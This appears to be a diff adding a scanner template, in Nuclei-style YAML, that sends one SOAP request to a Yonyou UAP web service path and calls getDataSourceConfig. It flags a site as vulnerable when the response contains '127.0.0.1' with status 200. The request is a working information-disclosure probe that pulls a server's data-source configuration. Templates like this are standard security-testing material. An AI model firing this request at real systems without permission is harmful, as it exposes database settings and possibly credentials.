@@ -1,0 +1,42 @@
+id: yongyou-uapw-xielou
+
+info:
+  name: WebFuzzer Template GXgvklpH
+  author: god
+  severity: low
+  description: write your description here
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:por="http://inittool.ses.itf.nc/PortalSESInitToolService">
+                     <soapenv:Header/>
+                     <soapenv:Body>
+                        <por:getDataSourceConfig/>
+                     </soapenv:Body>
+                    </soapenv:Envelope>
+
+
+  matchers-condition: and
+  matchers:
+    - type: word
+      words:
+        - '127.0.0.1'
+    - type: status
+      status:
+        - 200
+
+
+
+
